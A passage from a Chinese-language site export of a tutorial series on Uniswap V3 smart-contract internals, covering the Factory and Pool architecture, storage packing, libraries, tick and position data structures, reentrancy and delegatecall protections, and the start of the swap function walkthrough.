对数运算\n    TickBitmap\n      位图存储\n      O(1)查找\n      Gas优化\n\n8.2 关键公式总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n公式说明用途price = 1.0001^tickTick与价格的关系价格计算sqrtPriceX96 = √price × 2^96平方根价格的定点数表示合约存储wordPos = tick &gt;&gt; 8Tick在位图中的word位置位图查找bitPos = tick % 256Tick在word中的bit位置位图查找\n8.3 Gas优化技巧\n\n预计算表：避免运行时计算复杂幂运算\n位运算：使用位操作替代条件判断\n位图压缩：256个状态共享一个存储槽\n整数运算：避免浮点数带来的精度和效率问题\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨架构与合约设计，包括：\n\nFactory合约的单例模式\nPool合约的状态管理\nLibrary模式的深度应用\n核心数据结构设计\n\n\n参考资料\n\nUniswap V3 Core - TickMath.sol\nUniswap V3 Core - TickBitmap.sol\n定点数数学基础\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/03-架构与合约设计":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/03-架构与合约设计","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/03-架构与合约设计.md","title":"03-架构与合约设计","links":[],"tags":[],"content":"死磕Uniswap V3（三）：架构与合约设计\n\n本文是「死磕Uniswap V3」系列的第三篇，深入剖析V3的合约架构和核心数据结构设计。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01概述与集中流动性AMM演进、集中流动性原理02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07MEV与套利策略JIT、三明治攻击\n\n1. 整体架构概览\n1.1 合约层次结构\nUniswap V3采用了模块化的架构设计，将功能划分为多个层次：\nflowchart TB\n    subgraph UserLayer[&quot;用户层&quot;]\n        U1[交易者]\n        U2[流动性提供者]\n    end\n\n    subgraph PeripheryContracts[&quot;外围合约 Periphery Contracts&quot;]\n        R[SwapRouter]\n        PM[NonfungiblePositionManager]\n        Q[Quoter]\n    end\n\n    subgraph CoreContracts[&quot;核心合约 Core Contracts&quot;]\n        F[UniswapV3Factory]\n        P1[Pool A]\n        P2[Pool B]\n        P3[Pool C]\n    end\n\n    subgraph Libraries[&quot;库合约 Libraries&quot;]\n        TM[TickMath]\n        SM[SwapMath]\n        POS[Position]\n        TK[Tick]\n        TB[TickBitmap]\n        OR[Oracle]\n    end\n\n    U1 --&gt; R\n    U2 --&gt; PM\n    R --&gt; P1 &amp; P2 &amp; P3\n    PM --&gt; P1 &amp; P2 &amp; P3\n    F --&gt;|创建| P1 &amp; P2 &amp; P3\n    P1 &amp; P2 &amp; P3 --&gt; TM &amp; SM &amp; POS &amp; TK &amp; TB &amp; OR\n\n    style CoreContracts fill:#e3f2fd\n    style Libraries fill:#e8f5e9\n\n1.2 核心设计原则\nmindmap\n  root((V3架构设计))\n    模块化\n      接口分离\n      库复用\n      单一职责\n    Gas优化\n      存储槽打包\n      位运算优化\n      内联库函数\n    安全性\n      重入保护\n      余额验证\n      权限控制\n    可扩展性\n      工厂模式\n      多费率支持\n      预言机扩容\n\n\n2. Factory合约：单例工厂模式\n2.1 工厂合约的职责\nFactory合约是整个协议的入口点，负责池子的创建和参数管理：\nflowchart LR\n    subgraph FactoryDuties[&quot;Factory职责&quot;]\n        C1[创建Pool]\n        C2[管理费率]\n        C3[设置协议费]\n        C4[所有权管理]\n    end\n\n    subgraph KeyMappings[&quot;关键映射&quot;]\n        M1[&quot;getPool[token0][token1][fee]&quot;]\n        M2[&quot;feeAmountTickSpacing[fee]&quot;]\n    end\n\n    C1 --&gt; M1\n    C2 --&gt; M2\n\n    style FactoryDuties fill:#fff3e0\n\n2.2 核心数据结构\ncontract UniswapV3Factory is IUniswapV3Factory, UniswapV3PoolDeployer, NoDelegateCall {\n    address public override owner;\n \n    // 三层嵌套映射：确保每个代币对+费率只有一个池子\n    mapping(address =&gt; mapping(address =&gt; mapping(uint24 =&gt; address))) public override getPool;\n \n    // 费率与Tick间距的绑定关系\n    mapping(uint24 =&gt; int24) public override feeAmountTickSpacing;\n \n    constructor() {\n        owner = msg.sender;\n        emit OwnerChanged(address(0), msg.sender);\n \n        // 预设标准费率等级\n        feeAmountTickSpacing[500] = 10;    // 0.05% fee\n        feeAmountTickSpacing[3000] = 60;   // 0.30% fee\n        feeAmountTickSpacing[10000] = 200; // 1.00% fee\n    }\n}\n2.3 地址排序机制\n代币地址排序是确保池子唯一性的关键设计：\nflowchart TD\n    subgraph InputTokens[&quot;输入&quot;]\n        A[tokenA]\n        B[tokenB]\n    end\n\n    subgraph SortingLogic[&quot;排序逻辑&quot;]\n        CMP{tokenA &lt; tokenB?}\n        R1[&quot;token0 = tokenA&lt;br/&gt;token1 = tokenB&quot;]\n        R2[&quot;token0 = tokenB&lt;br/&gt;token1 = tokenA&quot;]\n    end\n\n    subgraph ResultPool[&quot;结果&quot;]\n        POOL[&quot;唯一池子地址&lt;br/&gt;getPool[token0][token1][fee]&quot;]\n    end\n\n    A &amp; B --&gt; CMP\n    CMP --&gt;|是| R1\n    CMP --&gt;|否| R2\n    R1 &amp; R2 --&gt; POOL\n\n    style SortingLogic fill:#e8f5e9\n\n地址排序的实现：\nfunction createPool(\n    address tokenA,\n    address tokenB,\n    uint24 fee\n) external override noDelegateCall returns (address pool) {\n    require(tokenA != tokenB);\n \n    // 关键：地址排序确保唯一性\n    (address token0, address token1) = tokenA &lt; tokenB\n        ? (tokenA, tokenB)\n        : (tokenB, tokenA);\n \n    require(token0 != address(0));\n \n    int24 tickSpacing = feeAmountTickSpacing[fee];\n    require(tickSpacing != 0);\n    require(getPool[token0][token1][fee] == address(0));\n \n    pool = deploy(address(this), token0, token1, fee, tickSpacing);\n \n    // 双向映射优化查询\n    getPool[token0][token1][fee] = pool;\n    getPool[token1][token0][fee] = pool;\n \n    emit PoolCreated(token0, token1, fee, tickSpacing, pool);\n}\n设计优势：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性说明唯一性保证相同代币对在特定费率下只能有一个池子查询优化无论查询顺序如何都能找到正确池子存储效率避免重复存储相同的池子前端友好简化前端的池子查找逻辑\n\n3. Pool合约：状态管理精髓\n3.1 接口的模块化组合\nV3将Pool接口拆分为多个子接口，体现了接口隔离原则：\nflowchart TB\n    subgraph IUniswapV3Pool\n        direction TB\n        I1[IUniswapV3PoolImmutables]\n        I2[IUniswapV3PoolState]\n        I3[IUniswapV3PoolDerivedState]\n        I4[IUniswapV3PoolActions]\n        I5[IUniswapV3PoolOwnerActions]\n        I6[IUniswapV3PoolEvents]\n    end\n\n    subgraph ResponsibilityDesc[&quot;职责说明&quot;]\n        D1[&quot;不可变属性&lt;br/&gt;factory, token0, token1, fee&quot;]\n        D2[&quot;状态变量&lt;br/&gt;slot0, liquidity, ticks&quot;]\n        D3[&quot;派生状态&lt;br/&gt;observe, snapshotCumulatives&quot;]\n        D4[&quot;用户操作&lt;br/&gt;swap, mint, burn, collect&quot;]\n        D5[&quot;管理操作&lt;br/&gt;setFeeProtocol, collectProtocol&quot;]\n        D6[&quot;事件定义&lt;br/&gt;Swap, Mint, Burn, Flash&quot;]\n    end\n\n    I1 --- D1\n    I2 --- D2\n    I3 --- D3\n    I4 --- D4\n    I5 --- D5\n    I6 --- D6\n\n    style IUniswapV3Pool fill:#e3f2fd\n\n// 接口的模块化组合\ninterface IUniswapV3Pool is\n    IUniswapV3PoolImmutables,    // 不可变属性\n    IUniswapV3PoolState,         // 状态变量\n    IUniswapV3PoolDerivedState,  // 派生状态\n    IUniswapV3PoolActions,       // 用户操作\n    IUniswapV3PoolOwnerActions,  // 管理员操作\n    IUniswapV3PoolEvents         // 事件定义\n{\n    // 空接口，纯组合\n}\n3.2 Slot0：极致的存储优化\nSlot0是V3最精妙的存储优化设计，将多个状态变量打包到单个存储槽中：\ngraph TB\n    subgraph &quot;Slot0 结构 (32字节存储槽)&quot;\n        direction LR\n        S1[&quot;sqrtPriceX96&lt;br/&gt;20字节&lt;br/&gt;(uint160)&quot;]\n        S2[&quot;tick&lt;br/&gt;3字节&lt;br/&gt;(int24)&quot;]\n        S3[&quot;observationIndex&lt;br/&gt;2字节&lt;br/&gt;(uint16)&quot;]\n        S4[&quot;observationCardinality&lt;br/&gt;2字节&lt;br/&gt;(uint16)&quot;]\n        S5[&quot;observationCardinalityNext&lt;br/&gt;2字节&lt;br/&gt;(uint16)&quot;]\n        S6[&quot;feeProtocol&lt;br/&gt;1字节&lt;br/&gt;(uint8)&quot;]\n        S7[&quot;unlocked&lt;br/&gt;1字节&lt;br/&gt;(bool)&quot;]\n    end\n\n    subgraph Total[&quot;总计&quot;]\n        T[&quot;20+3+2+2+2+1+1 = 31字节&lt;br/&gt;完美契合32字节存储槽&quot;]\n    end\n\n    S1 --&gt; S2 --&gt; S3 --&gt; S4 --&gt; S5 --&gt; S6 --&gt; S7\n    S7 --&gt; T\n\n    style T fill:#c8e6c9\n\nstruct Slot0 {\n    // 当前价格√P (Q64.96格式)\n    uint160 sqrtPriceX96;              // 20字节\n \n    // 当前tick\n    int24 tick;                        // 3字节\n \n    // 预言机观察者数组当前索引\n    uint16 observationIndex;           // 2字节\n \n    // 预言机数组当前容量\n    uint16 observationCardinality;     // 2字节\n \n    // 预言机数组目标容量\n    uint16 observationCardinalityNext; // 2字节\n \n    // 协议费率 (4位token0 + 4位token1)\n    uint8 feeProtocol;                 // 1字节\n \n    // 重入保护锁\n    bool unlocked;                     // 1字节\n}\n// 总计：31字节，完美契合32字节存储槽\nGas优化效果：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作传统设计Slot0设计节省读取价格+tick4200 gas2100 gas50%更新价格+tick10000+ gas5000 gas50%+swap单次读取多次SLOAD单次SLOAD显著\n3.3 Pool合约完整状态\ncontract UniswapV3Pool {\n    // 核心状态变量\n    Slot0 public override slot0;\n \n    // 全局费用增长累积器\n    uint256 public override feeGrowthGlobal0X128;\n    uint256 public override feeGrowthGlobal1X128;\n \n    // 协议费用累积\n    struct ProtocolFees {\n        uint128 token0;\n        uint128 token1;\n    }\n    ProtocolFees public override protocolFees;\n \n    // 当前有效流动性\n    uint128 public override liquidity;\n \n    // 核心数据结构映射\n    mapping(int24 =&gt; Tick.Info) public override ticks;\n    mapping(int16 =&gt; uint256) public override tickBitmap;\n    mapping(bytes32 =&gt; Position.Info) public override positions;\n \n    // 预言机观察者数组（固定大小）\n    Oracle.Observation[65535] public override observations;\n}\nflowchart TB\n    subgraph PoolStateVars[&quot;Pool状态变量&quot;]\n        direction TB\n        S0[Slot0&lt;br/&gt;打包状态]\n        FG[feeGrowthGlobal&lt;br/&gt;费用累积器]\n        PF[protocolFees&lt;br/&gt;协议费用]\n        LQ[liquidity&lt;br/&gt;当前流动性]\n    end\n\n    subgraph MappingStructure[&quot;映射结构&quot;]\n        TK[&quot;ticks&lt;br/&gt;mapping(int24 =&gt; Tick.Info)&quot;]\n        TB[&quot;tickBitmap&lt;br/&gt;mapping(int16 =&gt; uint256)&quot;]\n        PS[&quot;positions&lt;br/&gt;mapping(bytes32 =&gt; Position.Info)&quot;]\n    end\n\n    subgraph ArrayStructure[&quot;数组结构&quot;]\n        OB[&quot;observations[65535]&lt;br/&gt;固定大小预言机数组&quot;]\n    end\n\n    S0 --&gt; TK &amp; TB\n    LQ --&gt; PS\n    S0 --&gt; OB\n\n    style PoolStateVars fill:#e3f2fd\n    style MappingStructure fill:#fff3e0\n\n\n4. Library模式：代码复用与Gas优化\n4.1 核心库概览\nV3大量使用library实现代码复用和gas优化：\nflowchart LR\n    subgraph MathLibs[&quot;数学库&quot;]\n        TM[TickMath&lt;br/&gt;Tick↔价格转换]\n        SM[SwapMath&lt;br/&gt;交换计算]\n        SPM[SqrtPriceMath&lt;br/&gt;价格变化计算]\n        FM[FullMath&lt;br/&gt;高精度乘除]\n    end\n\n    subgraph DataStructLibs[&quot;数据结构库&quot;]\n        TK[Tick&lt;br/&gt;Tick信息管理]\n        PS[Position&lt;br/&gt;头寸管理]\n        TB[TickBitmap&lt;br/&gt;位图操作]\n        OR[Oracle&lt;br/&gt;预言机管理]\n    end\n\n    subgraph UtilLibs[&quot;工具库&quot;]\n        LM[LiquidityMath&lt;br/&gt;流动性计算]\n        BM[BitMath&lt;br/&gt;位运算]\n        TH[TransferHelper&lt;br/&gt;安全转账]\n    end\n\n    P[Pool合约] --&gt; MathLibs &amp; DataStructLibs &amp; UtilLibs\n\n    style MathLibs fill:#e8f5e9\n    style DataStructLibs fill:#fff3e0\n    style UtilLibs fill:#fce4ec\n\n4.2 TickMath库\nlibrary TickMath {\n    int24 internal constant MIN_TICK = -887272;\n    int24 internal constant MAX_TICK = -MIN_TICK;\n \n    uint160 internal constant MIN_SQRT_RATIO = 4295128739;\n    uint160 internal constant MAX_SQRT_RATIO =\n        1461446703485210103287273052203988822378723970342;\n \n    // Tick → √Price 转换\n    function getSqrtRatioAtTick(int24 tick)\n        internal pure returns (uint160 sqrtPriceX96);\n \n    // √Price → Tick 转换\n    function getTickAtSqrtRatio(uint160 sqrtPriceX96)\n        internal pure returns (int24 tick);\n}\n4.3 SwapMath库\nSwapMath处理交换过程中的核心数学计算：\nlibrary SwapMath {\n    /// @notice 计算单步交换的结果\n    function computeSwapStep(\n        uint160 sqrtRatioCurrentX96,    // 当前价格\n        uint160 sqrtRatioTargetX96,     // 目标价格\n        uint128 liquidity,              // 当前流动性\n        int256 amountRemaining,         // 剩余数量\n        uint24 feePips                  // 费率\n    ) internal pure returns (\n        uint160 sqrtRatioNextX96,       // 新价格\n        uint256 amountIn,               // 输入数量\n        uint256 amountOut,              // 输出数量\n        uint256 feeAmount               // 费用\n    );\n}\n4.4 Position库\nlibrary Position {\n    struct Info {\n        // 流动性数量\n        uint128 liquidity;\n \n        // 上次更新时的内部费用增长率\n        uint256 feeGrowthInside0LastX128;\n        uint256 feeGrowthInside1LastX128;\n \n        // 待领取的费用\n        uint128 tokensOwed0;\n        uint128 tokensOwed1;\n    }\n \n    /// @notice 获取头寸\n    function get(\n        mapping(bytes32 =&gt; Info) storage self,\n        address owner,\n        int24 tickLower,\n        int24 tickUpper\n    ) internal view returns (Position.Info storage position) {\n        position = self[keccak256(abi.encodePacked(owner, tickLower, tickUpper))];\n    }\n \n    /// @notice 更新头寸\n    function update(\n        Info storage self,\n        int128 liquidityDelta,\n        uint256 feeGrowthInside0X128,\n        uint256 feeGrowthInside1X128\n    ) internal;\n}\nLibrary设计优势：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优势说明代码复用同样的数学逻辑被多个合约使用Gas优化库函数在编译时内联，避免外部调用开销安全性核心数学逻辑集中维护，降低错误风险模块化功能分离便于测试和审计升级性可通过代理模式实现逻辑升级\n\n5. 核心数据结构设计\n5.1 Tick数据结构\nTick.Info存储了每个初始化tick的完整信息：\ngraph TB\n    subgraph &quot;Tick.Info 结构&quot;\n        L1[&quot;liquidityGross&lt;br/&gt;uint128&lt;br/&gt;此tick的总流动性&quot;]\n        L2[&quot;liquidityNet&lt;br/&gt;int128&lt;br/&gt;跨越时的流动性变化&quot;]\n        F1[&quot;feeGrowthOutside0X128&lt;br/&gt;uint256&quot;]\n        F2[&quot;feeGrowthOutside1X128&lt;br/&gt;uint256&quot;]\n        T1[&quot;tickCumulativeOutside&lt;br/&gt;int56&quot;]\n        S1[&quot;secondsPerLiquidityOutsideX128&lt;br/&gt;uint160&quot;]\n        S2[&quot;secondsOutside&lt;br/&gt;uint32&quot;]\n        I[&quot;initialized&lt;br/&gt;bool&quot;]\n    end\n\n    subgraph UsageCategory[&quot;用途分类&quot;]\n        Liquidity[&quot;流动性管理&quot;]\n        Fee[&quot;费用追踪&quot;]\n        Oracle[&quot;预言机数据&quot;]\n        Status[&quot;状态标记&quot;]\n    end\n\n    L1 &amp; L2 --&gt; Liquidity\n    F1 &amp; F2 --&gt; Fee\n    T1 &amp; S1 &amp; S2 --&gt; Oracle\n    I --&gt; Status\n\n    style UsageCategory fill:#e8f5e9\n\nlibrary Tick {\n    struct Info {\n        // 此tick的总流动性（用于限制单tick最大流动性）\n        uint128 liquidityGross;\n \n        // 从左向右跨越此tick时的流动性变化\n        // 正值：增加流动性；负值：减少流动性\n        int128 liquidityNet;\n \n        // tick外部的费用增长（用于计算区间内费用）\n        uint256 feeGrowthOutside0X128;\n        uint256 feeGrowthOutside1X128;\n \n        // tick外部的累积tick值（预言机用）\n        int56 tickCumulativeOutside;\n \n        // tick外部的每流动性秒数（预言机用）\n        uint160 secondsPerLiquidityOutsideX128;\n \n        // tick外部的累积秒数\n        uint32 secondsOutside;\n \n        // 是否已初始化\n        bool initialized;\n    }\n}\n5.2 liquidityNet的精妙设计\nflowchart LR\n    subgraph PriceMovement[&quot;价格从左向右移动&quot;]\n        T1[&quot;Tick A&lt;br/&gt;liquidityNet = +100&quot;]\n        T2[&quot;Tick B&lt;br/&gt;liquidityNet = -50&quot;]\n        T3[&quot;Tick C&lt;br/&gt;liquidityNet = -50&quot;]\n    end\n\n    subgraph LiquidityChange[&quot;流动性变化&quot;]\n        L1[&quot;L = 0&quot;]\n        L2[&quot;L = 100&quot;]\n        L3[&quot;L = 50&quot;]\n        L4[&quot;L = 0&quot;]\n    end\n\n    L1 --&gt;|&quot;跨越A&lt;br/&gt;+100&quot;| L2\n    L2 --&gt;|&quot;跨越B&lt;br/&gt;-50&quot;| L3\n    L3 --&gt;|&quot;跨越C&lt;br/&gt;-50&quot;| L4\n\n    T1 -.-&gt; L2\n    T2 -.-&gt; L3\n    T3 -.-&gt; L4\n\nliquidityNet符号约定：\n\n正值：从左向右跨越时增加流动性（进入某个LP的区间下界）\n负值：从左向右跨越时减少流动性（离开某个LP的区间上界）\n\n5.3 Tick跨越的”翻转”技巧\nfunction cross(\n    mapping(int24 =&gt; Tick.Info) storage self,\n    int24 tick,\n    uint256 feeGrowthGlobal0X128,\n    uint256 feeGrowthGlobal1X128,\n    uint160 secondsPerLiquidityCumulativeX128,\n    int56 tickCumulative,\n    uint32 time\n) internal returns (int128 liquidityNet) {\n    Tick.Info storage info = self[tick];\n \n    // &quot;翻转&quot;技巧：将outside值变为新的outside值\n    info.feeGrowthOutside0X128 = feeGrowthGlobal0X128 - info.feeGrowthOutside0X128;\n    info.feeGrowthOutside1X128 = feeGrowthGlobal1X128 - info.feeGrowthOutside1X128;\n    info.secondsPerLiquidityOutsideX128 =\n        secondsPerLiquidityCumulativeX128 - info.secondsPerLiquidityOutsideX128;\n    info.tickCumulativeOutside = tickCumulative - info.tickCumulativeOutside;\n    info.secondsOutside = time - info.secondsOutside;\n \n    liquidityNet = info.liquidityNet;\n}\nflowchart TB\n    subgraph BeforeCross[&quot;跨越前&quot;]\n        B1[&quot;outside = 累积到tick左侧的值&quot;]\n        B2[&quot;inside = global - outside&quot;]\n    end\n\n    subgraph CrossOperation[&quot;跨越操作&quot;]\n        OP[&quot;outside_new = global - outside_old&quot;]\n    end\n\n    subgraph AfterCross[&quot;跨越后&quot;]\n        A1[&quot;outside = 累积到tick右侧的值&quot;]\n        A2[&quot;inside = global - outside&quot;]\n    end\n\n    B1 --&gt; OP --&gt; A1\n\n    style CrossOperation fill:#fff3e0\n\n数学原理：当价格跨越tick时，“外部”和”内部”的概念发生翻转。通过简单的减法操作，原来的outside值就变成了新的outside值。\n5.4 Position数据结构\nstruct Position.Info {\n    // 此位置的流动性数量\n    uint128 liquidity;\n \n    // 上次更新时的内部费用增长率\n    uint256 feeGrowthInside0LastX128;\n    uint256 feeGrowthInside1LastX128;\n \n    // 累积的未领取费用\n    uint128 tokensOwed0;\n    uint128 tokensOwed1;\n}\n5.5 费用计算机制\nflowchart TD\n    subgraph FeeGrowthConcept[&quot;费用增长率概念&quot;]\n        G[&quot;全局费用增长率&lt;br/&gt;feeGrowthGlobalX128&quot;]\n        I[&quot;内部费用增长率&lt;br/&gt;feeGrowthInsideX128&quot;]\n        L[&quot;上次记录的内部费用增长率&lt;br/&gt;feeGrowthInsideLastX128&quot;]\n    end\n\n    subgraph CalculationFormula[&quot;计算公式&quot;]\n        F[&quot;应得费用 = &lt;br/&gt;(当前内部增长率 - 上次内部增长率) × 流动性&quot;]\n    end\n\n    G --&gt; I\n    I &amp; L --&gt; F\n\n    style CalculationFormula fill:#c8e6c9\n\nfunction update(\n    Info storage self,\n    int128 liquidityDelta,\n    uint256 feeGrowthInside0X128,\n    uint256 feeGrowthInside1X128\n) internal {\n    Info memory _self = self;\n \n    // 计算自上次更新以来的费用增长\n    uint128 tokensOwed0 = uint128(\n        FullMath.mulDiv(\n            feeGrowthInside0X128 - _self.feeGrowthInside0LastX128,\n            _self.liquidity,\n            FixedPoint128.Q128\n        )\n    );\n \n    uint128 tokensOwed1 = uint128(\n        FullMath.mulDiv(\n            feeGrowthInside1X128 - _self.feeGrowthInside1LastX128,\n            _self.liquidity,\n            FixedPoint128.Q128\n        )\n    );\n \n    // 更新流动性\n    if (liquidityDelta != 0) {\n        self.liquidity = LiquidityMath.addDelta(_self.liquidity, liquidityDelta);\n    }\n \n    // 更新费用增长记录点\n    self.feeGrowthInside0LastX128 = feeGrowthInside0X128;\n    self.feeGrowthInside1LastX128 = feeGrowthInside1X128;\n \n    // 累积欠付费用\n    if (tokensOwed0 &gt; 0 || tokensOwed1 &gt; 0) {\n        self.tokensOwed0 += tokensOwed0;\n        self.tokensOwed1 += tokensOwed1;\n    }\n}\n费用计算设计优势：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性说明O(1)复杂度无论时间间隔多长，计算复杂度都是常数精确累积避免复合计算中的精度损失存储高效只存储差值而非绝对值自动更新每次流动性变化时自动更新费用\n\n6. 安全机制设计\n6.1 重入保护\nmodifier lock() {\n    require(slot0.unlocked, &#039;LOK&#039;);\n    slot0.unlocked = false;\n    _;\n    slot0.unlocked = true;\n}\nsequenceDiagram\n    participant User as 用户\n    participant Pool as Pool合约\n    participant External as 外部合约\n\n    User-&gt;&gt;Pool: swap()\n    Pool-&gt;&gt;Pool: require(unlocked)\n    Pool-&gt;&gt;Pool: unlocked = false\n    Pool-&gt;&gt;External: callback\n    External--&gt;&gt;Pool: 尝试重入\n    Pool--&gt;&gt;External: revert(&#039;LOK&#039;)\n    Pool-&gt;&gt;Pool: unlocked = true\n    Pool--&gt;&gt;User: 返回结果\n\n6.2 NoDelegateCall保护\nabstract contract NoDelegateCall {\n    address private immutable original;\n \n    constructor() {\n        original = address(this);\n    }\n \n    modifier noDelegateCall() {\n        require(address(this) == original);\n        _;\n    }\n}\n6.3 回调验证机制\nflowchart TD\n    subgraph SwapCallbackFlow[&quot;swap回调流程&quot;]\n        S1[记录balance0Before]\n        S2[调用callback]\n        S3[验证balance0变化]\n        S4{balance增加足够?}\n        S5[交易成功]\n        S6[revert IIA]\n    end\n\n    S1 --&gt; S2 --&gt; S3 --&gt; S4\n    S4 --&gt;|是| S5\n    S4 --&gt;|否| S6\n\n    style S6 fill:#ffcdd2\n\n// 在swap函数中\nuint256 balance0Before = balance0();\nIUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\nrequire(balance0Before.add(uint256(amount0)) &lt;= balance0(), &#039;IIA&#039;);\n\n7. 本章小结\n7.1 架构设计要点\nmindmap\n  root((V3架构精髓))\n    工厂模式\n      统一池子管理\n      地址排序确保唯一\n      费率参数化\n    存储优化\n      Slot0打包设计\n      节省50% Gas\n      单次SLOAD读取\n    Library模式\n      代码复用\n      编译时内联\n      集中维护\n    数据结构\n      Tick的liquidityNet\n      翻转技巧\n      费用增长率\n    安全机制\n      重入保护\n      余额验证\n      权限控制\n\n7.2 关键设计模式总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n模式应用场景效果单例工厂Pool创建统一管理，确保唯一性接口隔离IUniswapV3Pool职责分离，易于维护存储槽打包Slot050%+ Gas节省库内联所有Library消除外部调用开销增量累积费用计算O(1)时间复杂度\n\n下一篇预告\n在下一篇文章中，我们将深入探讨交换机制深度解析，包括：\n\nswap函数的完整执行流程\n跨Tick交换的实现细节\n价格发现机制\n滑点控制与保护\n\n\n参考资料\n\nUniswap V3 Core - UniswapV3Factory.sol\nUniswap V3 Core - UniswapV3Pool.sol\nUniswap V3 Core - Libraries\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/04-交换机制深度解析":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/04-交换机制深度解析","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/04-交换机制深度解析.md","title":"04-交换机制深度解析","links":[],"tags":[],"content":"死磕Uniswap V3（四）：交换机制深度解析\n\n本文是「死磕Uniswap V3」系列的第四篇，深入剖析V3的核心交换函数swap()的完整执行流程。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01概述与集中流动性AMM演进、集中流动性原理02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07MEV与套利策略JIT、三明治攻击\n\n1. 交换函数概览\n1.1 swap函数的核心职责\nswap函数是Uniswap V3中最复杂也最核心的函数，负责处理所有代币交换逻辑：\nflowchart TB\n    subgraph InputParams[&quot;输入参数&quot;]\n        R[recipient&lt;br/&gt;接收地址]\n        Z[zeroForOne&lt;br/&gt;交换方向]\n        A[amountSpecified&lt;br/&gt;指定数量]\n        S[sqrtPriceLimitX96&lt;br/&gt;价格限制]\n        D[data&lt;br/&gt;回调数据]\n    end\n\n    subgraph SwapFunctions[&quot;swap函数职责&quot;]\n        P1[价格发现]\n        P2[跨Tick遍历]\n        P3[流动性管理]\n        P4[费用计算]\n        P5[预言机更新]\n        P6[代币转账]\n    end\n\n    subgraph Output[&quot;输出&quot;]\n        O1[amount0&lt;br/&gt;token0变化量]\n        O2[amount1&lt;br/&gt;token1变化量]\n    end\n\n    R --&gt; P1\n    Z --&gt; P2\n    A --&gt; P3\n    S --&gt; P4\n    D --&gt; P5\n    P1 --&gt; O1\n    P2 --&gt; O1\n    P3 --&gt; O2\n    P4 --&gt; O2\n    P5 --&gt; O1\n    P6 --&gt; O2\n\n    style SwapFunctions fill:#e3f2fd\n\n1.2 函数签名详解\nfunction swap(\n    address recipient,          // 输出代币接收地址\n    bool zeroForOne,           // true: token0→token1, false: token1→token0\n    int256 amountSpecified,    // 正数=精确输入, 负数=精确输出\n    uint160 sqrtPriceLimitX96, // 价格滑点保护限制\n    bytes calldata data        // 回调函数的附加数据\n) external override noDelegateCall returns (\n    int256 amount0,            // token0的净变化量\n    int256 amount1             // token1的净变化量\n);\n参数含义详解：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数类型说明recipientaddress接收输出代币的地址zeroForOnebool交换方向标志amountSpecifiedint256正数=exactInput，负数=exactOutputsqrtPriceLimitX96uint160最大允许的价格变动databytes传递给回调函数的数据\n1.3 交换方向与价格关系\nflowchart LR\n    subgraph TrueGroup[&quot;zeroForOne = true&quot;]\n        A1[卖出token0]\n        A2[买入token1]\n        A3[价格下降]\n        A4[tick减小]\n        A1 --&gt; A2\n        A2 --&gt; A3\n        A3 --&gt; A4\n    end\n\n    subgraph FalseGroup[&quot;zeroForOne = false&quot;]\n        B1[卖出token1]\n        B2[买入token0]\n        B3[价格上升]\n        B4[tick增大]\n        B1 --&gt; B2\n        B2 --&gt; B3\n        B3 --&gt; B4\n    end\n\n    style TrueGroup fill:#ffcdd2\n    style FalseGroup fill:#c8e6c9\n\n\n2. 核心数据结构\n2.1 SwapState：交换状态追踪\nSwapState结构体在整个交换循环中追踪状态变化：\nstruct SwapState {\n    // 剩余待交换的数量\n    int256 amountSpecifiedRemaining;\n \n    // 已计算的对应数量\n    int256 amountCalculated;\n \n    // 当前价格\n    uint160 sqrtPriceX96;\n \n    // 当前tick\n    int24 tick;\n \n    // 输入代币的全局费用增长率\n    uint256 feeGrowthGlobalX128;\n \n    // 协议费用累积\n    uint128 protocolFee;\n \n    // 当前有效流动性\n    uint128 liquidity;\n}\ngraph TB\n    subgraph SwapStateStruct[&quot;SwapState结构&quot;]\n        S1[amountSpecifiedRemaining&lt;br/&gt;剩余交换量]\n        S2[amountCalculated&lt;br/&gt;已计算量]\n        S3[sqrtPriceX96&lt;br/&gt;当前价格]\n        S4[tick&lt;br/&gt;当前tick]\n        S5[feeGrowthGlobalX128&lt;br/&gt;费用增长率]\n        S6[protocolFee&lt;br/&gt;协议费用]\n        S7[liquidity&lt;br/&gt;当前流动性]\n    end\n\n    subgraph StateEvolution[&quot;状态演变&quot;]\n        E1[初始化]\n        E2[每步更新]\n        E3[最终状态]\n    end\n\n    E1 --&gt;|&quot;设置&quot;| S1\n    E1 --&gt;|&quot;设置&quot;| S2\n    E1 --&gt;|&quot;设置&quot;| S3\n    E1 --&gt;|&quot;设置&quot;| S4\n    E1 --&gt;|&quot;设置&quot;| S5\n    E1 --&gt;|&quot;设置&quot;| 